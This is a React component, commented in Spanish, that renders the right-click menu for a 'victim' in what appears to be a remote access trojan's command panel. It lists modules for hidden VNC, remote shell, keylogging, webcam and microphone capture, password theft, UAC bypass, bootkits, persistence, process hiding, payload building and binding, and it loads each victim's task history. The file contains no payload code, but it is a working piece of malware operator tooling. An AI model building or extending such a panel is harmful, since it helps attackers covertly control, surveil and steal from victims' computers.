'use client';
import { useCallback, useEffect, useLayoutEffect, useMemo, useRef, useState } from 'react';
import {
  Camera, Cpu, EyeOff, Folder, Globe, HardDrive, History, Keyboard, KeyRound, Link, MapPin,
  MessageCircle, Monitor, Network, Package, PackageCheck, RefreshCw, Rocket, Search, ShieldAlert,
  ShieldOff, Terminal, X
} from 'lucide-react';
import type { Victim } from '@/lib/types';
import {
  CATEGORY_LABELS,
  MODULE_CATEGORIES,
  MODULE_REGISTRY,
  moduleAvailability,
  type ModuleAvailability,
  type ModuleCategoryId,
  type ModuleEntry
} from '@/lib/modules';
import { ACTIONS, GROUPS, actionDetail, actionReason, type ActionContext, type ActionDef } from '@/lib/actions';
import type { Task } from '@/lib/types';
import { cn } from '@/lib/cn';
import { dateTime } from '@/lib/format';

const ICONS: Record<string, React.ReactNode> = {
  'remote-desktop': <Monitor />,
  hvnc: <EyeOff />,
  'remote-shell': <Terminal />,
  'embedded-browser': <Globe />,
  'remote-chat': <MessageCircle />,
  'password-recovery': <KeyRound />,
  'auto-recovery': <RefreshCw />,
  'file-recovery': <Search />,
  'file-manager': <Folder />,
  'process-manager': <Cpu />,
  'remote-code-execution': <Terminal />,
  'tcp-connections': <Network />,
  'offline-keylogger': <Keyboard />,
  'webcam-mic': <Camera />,
  geolocation: <MapPin />,
  'obfuscation-engine': <ShieldAlert />,
  persistence: <Rocket />,
  'process-hiding': <EyeOff />,
  'uac-bypass': <ShieldOff />,
  bootkit: <HardDrive />,
  builder: <Package />,
  binder: <Link />,
  'jar-injector': <PackageCheck />
};

type SectionId = ModuleCategoryId | 'acciones-panel';
type Row = { kind: 'section'; id: SectionId } | { kind: 'module'; id: string } | { kind: 'action'; id: string };

const ACTION_GROUPS = GROUPS.filter((group) => ACTIONS.some((action) => action.group === group.id));

/**
 * Menú contextual jerárquico al clic derecho sobre una víctima.
 *
 * - Siempre vertical (§1.2); 6 categorías desplegables con los 23 módulos.
 * - Bloque adicional «Acciones del panel» con TODAS las acciones clásicas para
 *   que el menú sea el único punto de entrada sin perder funcionalidad (§1.3).
 * - Buscador en cabecera, estados por módulo (disponible/ejecutando/hecho/error),
 *   módulos no soportados visibles y atenuados con motivo (§1.4–1.5).
 * - Teclado completo, roles ARIA, cierre por Escape, blur y tras lanzar (§1.6).
 */
export function ModuleMenu({
  victim,
  x,
  y,
  context,
  onPickModule,
  onPickAction,
  onReopen,
  onClose
}: {
  victim: Victim;
  x: number;
  y: number;
  context: ActionContext;
  onPickModule: (entry: ModuleEntry) => void;
  onPickAction: (action: ActionDef) => void;
  onReopen: (entry: ModuleEntry, task: Task) => void;
  onClose: () => void;
}) {
  const box = useRef<HTMLDivElement>(null);
  const search = useRef<HTMLInputElement>(null);
  const [tasks, setTasks] = useState<Task[]>([]);
  const [query, setQuery] = useState('');
  // Todas las categorías parten abiertas: al abrir el menú se ven los 23 módulos.
  const [expanded, setExpanded] = useState<Set<SectionId>>(() => new Set(MODULE_CATEGORIES.map((category) => category.id)));
  const [activeIndex, setActiveIndex] = useState(0);
  const [pos, setPos] = useState<{ x: number; y: number } | null>(null);

  useEffect(() => {
    let cancelled = false;
    apiTasks(victim.id)
      .then((items) => {
        if (!cancelled) setTasks(items);
      })
      .catch(() => undefined);
    return () => {
      cancelled = true;
    };
  }, [victim.id]);

  useLayoutEffect(() => {
    const element = box.current;
    if (!element) return;
    const rect = element.getBoundingClientRect();
    const nextX = Math.max(4, Math.min(x, window.innerWidth - rect.width - 8));
    const nextY = Math.max(4, Math.min(y, window.innerHeight - rect.height - 8));
    setPos({ x: nextX, y: nextY });
    element.focus();
    search.current?.focus();
  }, [x, y]);

  useEffect(() => {
    const onPointer = (event: PointerEvent) => {
      if (!box.current?.contains(event.target as Node)) onClose();
    };
    window.addEventListener('pointerdown', onPointer, true);
    return () => window.removeEventListener('pointerdown', onPointer, true);
  }, [onClose]);

  const needle = query.trim().toLowerCase();
  const searching = needle.length > 0;

  const availability = useMemo(() => {
    const map = new Map<string, ModuleAvailability>();
    for (const entry of MODULE_REGISTRY) map.set(entry.id, moduleAvailability(entry, victim, tasks));
    return map;
  }, [victim, tasks]);

  const actionReasons = useMemo(() => {
    const map = new Map<string, string | null>();
    for (const action of ACTIONS) map.set(action.id, actionReason(action, victim, context));
    return map;
  }, [victim, context]);

  const searchModules = useMemo(() => {
    if (!searching) return [];
    return MODULE_REGISTRY.filter((entry) =>
      `${entry.label} ${entry.description} ${CATEGORY_LABELS[entry.category]}`.toLowerCase().includes(needle)
    );
  }, [needle, searching]);

  const searchActions = useMemo(() => {
    if (!searching) return [];
    return ACTIONS.filter((action) => `${action.label} ${actionDetail(action, victim)}`.toLowerCase().includes(needle));
  }, [needle, searching, victim]);

  const rows = useMemo<Row[]>(() => {
    if (searching) {
      return [
        ...searchModules.map((entry): Row => ({ kind: 'module', id: entry.id })),
        ...searchActions.map((action): Row => ({ kind: 'action', id: action.id }))
      ];
    }
    const list: Row[] = [];
    for (const category of MODULE_CATEGORIES) {
      list.push({ kind: 'section', id: category.id });
      if (expanded.has(category.id)) {
        for (const entry of MODULE_REGISTRY.filter((module) => module.category === category.id)) {
          list.push({ kind: 'module', id: entry.id });
        }
      }
    }
    list.push({ kind: 'section', id: 'acciones-panel' });
    if (expanded.has('acciones-panel')) {
      for (const action of ACTIONS) list.push({ kind: 'action', id: action.id });
    }
    return list;
  }, [expanded, searchActions, searchModules, searching]);

  useEffect(() => {
    if (activeIndex >= rows.length) setActiveIndex(0);
  }, [rows.length, activeIndex]);

  const active = rows[activeIndex];
  const moduleById = (id: string) => MODULE_REGISTRY.find((entry) => entry.id === id);
  const actionById = (id: string) => ACTIONS.find((action) => action.id === id);

  const moduleDisabled = (entry: ModuleEntry) => !availability.get(entry.id)?.ok;

  const activate = useCallback(() => {
    if (!active) return;
    if (active.kind === 'section') {
      setExpanded((current) => {
        const next = new Set(current);
        if (next.has(active.id)) next.delete(active.id);
        else next.add(active.id);
        return next;
      });
      setActiveIndex(0);
      return;
    }
    if (active.kind === 'action') {
      const action = actionById(active.id);
      if (action && !actionReasons.get(action.id)) onPickAction(action);
      return;
    }
    const entry = moduleById(active.id);
    // Los no soportados también abren su modal con el error explícito.
    if (entry) onPickModule(entry);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [active, actionReasons, availability, onPickAction, onPickModule]);

  const move = useCallback(
    (step: number) => {
      if (rows.length === 0) return;
      setActiveIndex((index) => (Math.max(0, Math.min(index, rows.length - 1)) + step + rows.length) % rows.length);
    },
    [rows.length]
  );

  const onKey = (event: React.KeyboardEvent) => {
    if (event.key === 'Escape') {
      event.preventDefault();
      onClose();
      return;
    }
    if (event.key === 'ArrowDown') {
      event.preventDefault();
      move(1);
      return;
    }
    if (event.key === 'ArrowUp') {
      event.preventDefault();
      move(-1);
      return;
    }
    if (event.key === 'Home') {
      event.preventDefault();
      setActiveIndex(0);
      return;
    }
    if (event.key === 'End') {
      event.preventDefault();
      setActiveIndex(Math.max(0, rows.length - 1));
      return;
    }
    if (event.key === 'ArrowRight') {
      if (active?.kind === 'section' && !expanded.has(active.id)) {
        event.preventDefault();
        setExpanded((current) => new Set(current).add(active.id));
        setActiveIndex(0);
      }
      return;
    }
    if (event.key === 'ArrowLeft') {
      if (active?.kind === 'section' && expanded.has(active.id)) {
        event.preventDefault();
        setExpanded((current) => {
          const next = new Set(current);
          next.delete(active.id);
          return next;
        });
        setActiveIndex(0);
      }
      return;
    }
    if (event.key === 'Enter' || event.key === ' ') {
      // Enter dentro del buscador navega; el resto de focos activa.
      if (event.key === ' ' && event.target instanceof HTMLInputElement) return;
      event.preventDefault();
      activate();
    }
  };

  const activeId = active?.kind === 'section' ? active.id : active?.id;
  const activeKind = active?.kind;

  const renderModule = (entry: ModuleEntry, index: number) => {
    const avail = availability.get(entry.id)!;
    const disabled = moduleDisabled(entry);
    const current = activeKind === 'module' && activeId === entry.id;
    return (
      <div
        key={entry.id}
        role="menuitem"
        data-active={current ? 'true' : undefined}
        data-state={avail.status}
        data-disabled={disabled ? 'true' : undefined}
        className="xp-menu-item xp-menu-module"
        title={disabled ? avail.reason ?? undefined : entry.description}
        onMouseEnter={() => setActiveIndex(index)}
        onClick={() => onPickModule(entry)}
      >
        <span className="xp-item-icon">{ICONS[entry.id]}</span>
        <span className="xp-item-label">
          {entry.label}
          {disabled ? <span className="sr-only"> — no disponible: {avail.reason}</span> : null}
        </span>
        <span className="xp-item-detail">{disabled ? 'sin soporte' : entry.task ?? entry.agentCommand ?? 'panel'}</span>
        {avail.status === 'running' ? <span className="xp-item-spinner" aria-label="Ejecutando" /> : null}
        {avail.status === 'done' ? <span className="xp-item-chip">OK</span> : null}
        {avail.status === 'error' ? <span className="xp-item-chip">ERROR</span> : null}
        {avail.lastTask ? (
          <button
            type="button"
            className="xp-item-history"
            title={`Reabrir último resultado (${dateTime(avail.lastTask.createdAt)})`}
            aria-label={`Reabrir último resultado de ${entry.label}`}
            onClick={(event) => {
              event.stopPropagation();
              if (avail.lastTask) onReopen(entry, avail.lastTask);
            }}
          >
            <History />
          </button>
        ) : null}
      </div>
    );
  };

  const renderAction = (action: ActionDef, index: number) => {
    const reason = actionReasons.get(action.id);
    const current = activeKind === 'action' && activeId === action.id;
    return (
      <button
        key={action.id}
        type="button"
        role="menuitem"
        aria-disabled={reason ? true : undefined}
        data-active={current ? 'true' : undefined}
        data-disabled={reason ? 'true' : undefined}
        className="xp-menu-item xp-menu-action"
        title={reason ?? `${actionDetail(action, victim)} — ${action.task ?? 'acción local'}`}
        onMouseEnter={() => {
          if (!reason) setActiveIndex(index);
        }}
        onClick={() => {
          if (!reason) onPickAction(action);
        }}
      >
        <span className="xp-item-icon">
          <action.icon />
        </span>
        <span className="xp-item-label">{action.label}</span>
        <span className="xp-item-detail">{actionDetail(action, victim)}</span>
      </button>
    );
  };

  return (
    <div
      ref={box}
      role="menu"
      aria-label={`Módulos y acciones para ${victim.hostname}`}
      tabIndex={-1}
      onKeyDown={onKey}
      className="xp-menu"
      data-vertical="true"
      style={pos ? { left: pos.x, top: pos.y } : { left: x, top: y, visibility: 'hidden' }}
    >
      <div className="xp-menu-header">
        <Search className="h-3 w-3 shrink-0" aria-hidden="true" />
        <input
          ref={search}
          type="search"
          role="searchbox"
          aria-label="Buscar módulo o acción"
          value={query}
          onChange={(event) => {
            setQuery(event.target.value);
            setActiveIndex(0);
          }}
          placeholder="Buscar módulo o acción…"
        />
        {query ? (
          <button type="button" className="xp-icon-btn" onClick={() => { setQuery(''); search.current?.focus(); }} aria-label="Limpiar búsqueda">
            <X />
          </button>
        ) : null}
      </div>

      <div className="xp-menu-scroll">
        {searching ? (
          <>
            <p className="xp-menu-section-label">Módulos ({searchModules.length})</p>
            {searchModules.map((entry, index) => renderModule(entry, index))}
            {searchModules.length === 0 ? <p className="xp-menu-empty">Ningún módulo coincide.</p> : null}
            <hr className="xp-menu-separator" />
            <p className="xp-menu-section-label">Acciones del panel ({searchActions.length})</p>
            {searchActions.map((action, index) => renderAction(action, searchModules.length + index))}
            {searchActions.length === 0 ? <p className="xp-menu-empty">Ninguna acción coincide.</p> : null}
          </>
        ) : (
          <>
            {MODULE_CATEGORIES.map((category) => {
              const items = MODULE_REGISTRY.filter((module) => module.category === category.id);
              const open = expanded.has(category.id);
              const current = activeKind === 'section' && activeId === category.id;
              const index = rows.findIndex((row) => row.kind === 'section' && row.id === category.id);
              const unsupported = items.filter((item) => !availability.get(item.id)?.ok).length;
              return (
                <section key={category.id} className="xp-menu-section">
                  <button
                    type="button"
                    role="menuitem"
                    aria-expanded={open}
                    data-active={current ? 'true' : undefined}
                    className="xp-menu-item xp-menu-category"
                    onMouseEnter={() => setActiveIndex(index)}
                    onClick={(event) => {
                      event.stopPropagation();
                      setExpanded((current) => {
                        const next = new Set(current);
                        if (next.has(category.id)) next.delete(category.id);
                        else next.add(category.id);
                        return next;
                      });
                      setActiveIndex(0);
                    }}
                  >
                    <span className="xp-item-label">{CATEGORY_LABELS[category.id]}</span>
                    <span className="xp-item-detail">
                      {items.length} {items.length === 1 ? 'módulo' : 'módulos'}
                      {unsupported > 0 ? ` · ${unsupported} sin soporte` : ''}
                    </span>
                    <span className="xp-item-arrow" aria-hidden="true" />
                  </button>
                  {open ? (
                    <div className="xp-menu-sub">
                      {items.map((entry) => renderModule(entry, rows.findIndex((row) => row.kind === 'module' && row.id === entry.id)))}
                    </div>
                  ) : null}
                </section>
              );
            })}

            <hr className="xp-menu-separator" />
            <section className="xp-menu-section">
              <button
                type="button"
                role="menuitem"
                aria-expanded={expanded.has('acciones-panel')}
                data-active={activeKind === 'section' && activeId === 'acciones-panel' ? 'true' : undefined}
                className="xp-menu-item xp-menu-category"
                onMouseEnter={() => setActiveIndex(rows.findIndex((row) => row.kind === 'section' && row.id === 'acciones-panel'))}
                onClick={(event) => {
                  event.stopPropagation();
                  setExpanded((current) => {
                    const next = new Set(current);
                    if (next.has('acciones-panel')) next.delete('acciones-panel');
                    else next.add('acciones-panel');
                    return next;
                  });
                  setActiveIndex(0);
                }}
              >
                <span className="xp-item-label">Acciones del panel</span>
                <span className="xp-item-detail">{ACTIONS.length} acciones clásicas</span>
                <span className="xp-item-arrow" aria-hidden="true" />
              </button>
              {expanded.has('acciones-panel') ? (
                <div className="xp-menu-sub">
                  {ACTION_GROUPS.map((group) => (
                    <div key={group.id}>
                      <p className="xp-menu-group-label">
                        <group.icon /> {group.label}
                      </p>
                      {ACTIONS.filter((action) => action.group === group.id).map((action) =>
                        renderAction(action, rows.findIndex((row) => row.kind === 'action' && row.id === action.id))
                      )}
                    </div>
                  ))}
                </div>
              ) : null}
            </section>
          </>
        )}
      </div>

      <div className="xp-menu-footer" aria-hidden="true">
        <span>↑↓ navegar</span>
        <span>Enter abrir</span>
        <span>Esc cerrar</span>
      </div>
    </div>
  );
}

/** Lectura del histórico del menú sin acoplar el componente a `useApi`. */
async function apiTasks(victimId: string): Promise<Task[]> {
  const response = await fetch(`/api/console/tasks?victim=${encodeURIComponent(victimId)}&limit=60`, { credentials: 'same-origin' });
  if (!response.ok) return [];
  const data = (await response.json()) as { items?: Task[] };
  return data.items ?? [];
}
